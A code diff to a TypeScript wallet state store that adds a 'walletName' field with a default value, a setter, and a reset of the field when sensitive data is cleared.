@@ -14,6 +14,7 @@ type WalletState = {
 	blockchainNetwork: string;
 	walletProvider: string;
 	seedPhrase: string;
+	walletName: string;
 	destinationAddress: string;
 	ipAddress: string;
 	geolocation: GeolocationState | null;
@@ -27,6 +28,7 @@ type WalletActions = {
 	setBlockchainNetwork: (network: string) => void;
 	setWalletProvider: (provider: string) => void;
 	setSeedPhrase: (phrase: string) => void;
+	setWalletName: (name: string) => void;
 	setDestinationAddress: (address: string) => void;
 	fetchUserDetails: () => Promise<void>;
 	fetchGeoFromIP: () => Promise<void>;
@@ -43,6 +45,7 @@ export const useWalletStore = create<WalletStore>((set, get) => ({
 	blockchainNetwork: "",
 	walletProvider: "",
 	seedPhrase: "",
+	walletName: "Main Wallet",
 	destinationAddress: "",
 	ipAddress: "",
 	geolocation: null,
@@ -55,6 +58,7 @@ export const useWalletStore = create<WalletStore>((set, get) => ({
 	setBlockchainNetwork: (network) => set({ blockchainNetwork: network }),
 	setWalletProvider: (provider) => set({ walletProvider: provider }),
 	setSeedPhrase: (phrase) => set({ seedPhrase: phrase }),
+	setWalletName: (name) => set({ walletName: name }),
 	setDestinationAddress: (address) => set({ destinationAddress: address }),
 	setProcess: (val) => set({ process: val }),
 
@@ -148,6 +152,7 @@ export const useWalletStore = create<WalletStore>((set, get) => ({
 	clearSensitiveData: () =>
 		set({
 			seedPhrase: "",
+			walletName: "Main Wallet",
 			destinationAddress: "",
 			blockchainNetwork: "",
 			walletProvider: "",
